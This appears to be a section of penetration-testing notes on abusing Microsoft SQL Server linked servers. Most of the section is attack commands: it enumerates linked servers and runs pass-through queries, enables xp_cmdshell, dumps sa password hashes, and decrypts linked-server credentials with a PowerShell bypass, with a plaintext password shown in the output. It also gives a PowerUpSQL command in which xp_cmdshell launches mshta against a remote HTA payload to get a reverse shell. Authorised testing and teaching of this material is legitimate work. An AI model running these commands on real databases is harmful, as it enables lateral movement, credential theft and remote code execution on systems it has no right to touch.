\section{Communicate with Other Databases}
MSSQL has a configuration option called
\href{https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine}{linked
servers}. Linked servers are typically configured to enable the database engine
to execute a Transact-SQL statement that includes tables in another instance of
SQL Server, or another database product such as Oracle.

If we manage to gain access to a SQL Server with a linked server configured, we
may be able to move laterally to that database server. Administrators can
configure a linked server using credentials from the remote server. If those
credentials have sysadmin privileges, we may be able to execute commands in the
remote SQL instance. Let's see how we can identify and execute queries on
linked servers.

\begin{verbatim}
SELECT srvname, isremote FROM master..sysservers
\end{verbatim}

see sysservers
\href{https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql}{Transact-SQL} for more information.

Next, we can attempt to identify the user used for the connection and its
privileges. The
\href{https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql}{EXECUTE}
statement can be used to send pass-through commands to linked servers. We add
our command between parenthesis and specify the linked server between square
brackets ([ ]).

\begin{verbatim}
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') 
    AT [10.0.0.12\SQLEXPRESS]
\end{verbatim}

If we need to use quotes in our query to the linked server, we need to use single double quotes to escape the single quote. To run multiples commands at once we can divide them up with a semi colon (;).

As we have seen, we can now execute queries with sysadmin privileges on the
linked server. As sysadmin, we control the SQL Server instance. We can read
data from any database or execute system commands with \verb+xp_cmdshell+.

\begin{verbatim}
select * from openquery("ZSM-SVRCSQL02", 'select * from master..sysservers')
select * from openquery("ZSM-SVRCSQL02", 'exec xp_cmdshell ''whoami''')


select * from openquery("ZSM-SVRCSQL02", 'select name,password_hash from sys.sql_logins where name=''sa''');
select * from openquery("ZSM-SVRCSQL02", 'select name,password_hash from sys.sql_logins ');
\end{verbatim}



\subsection{Extracting passwords from SQL Server Linked Servers}

An attacker can extract SQL Server Linked Servers passwords from the SQL Instances and get them in clear text, granting the attacker passwords that can be used to acquire a greater foothold on the target.

\begin{itemize}
    \item \href{https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#extracting-passwords-from-sql-server-linked-servers}{hacktricks}
    \item \href{https://www.netspi.com/blog/technical/adversary-simulation/decrypting-mssql-credential-passwords/}{Decrypting MSSQL Credential Passwords}
    \item \href{https://www.hackingarticles.in/mssql-for-pentester-abusing-linked-database/}{MSSQL for Pentester: Abusing Linked Database}
\end{itemize}


tool \href{https://github.com/IamLeandrooooo/SQLServerLinkedServersPasswords/}{DecryptLinkedServersPasswords.ps1}

can be launched by \verb+Administrator+ or inside db with \verb+sa+:
\begin{verbatim}
exec xp_cmdshell 'powershell -exec bypass c:\temp\DecryptLinkedServersPasswords.ps1'

MSSQLSERVER ZSM-SVRCSQL02 sa       VeryUncrackablePassword2022!
\end{verbatim}



\subsection{RevShell on linked server}

\href{https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/}{SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server}

with clear text creds of sa on linked server and powerupsql

\begin{verbatim}
Get-SQLServerLinkCrawl -Username sa -Password Password@1 -Instance WIN-P83OS778EQK\SQLEXPRESS -Query "exec master..xp_cmdshell 'mshta.exe http://192.168.1.2:8080/ugfFOJBvO.hta'"
\end{verbatim}


\begin{verbatim}
select 1 from openquery("ZSM-SVRCSQL02", 'select 1; exec sp_configure ''show advanced options'', 1; reconfigure')
select 1 from openquery("ZSM-SVRCSQL02", 'select 1; exec sp_configure ''xp_cmdshell'', 1; reconfigure')
\end{verbatim}

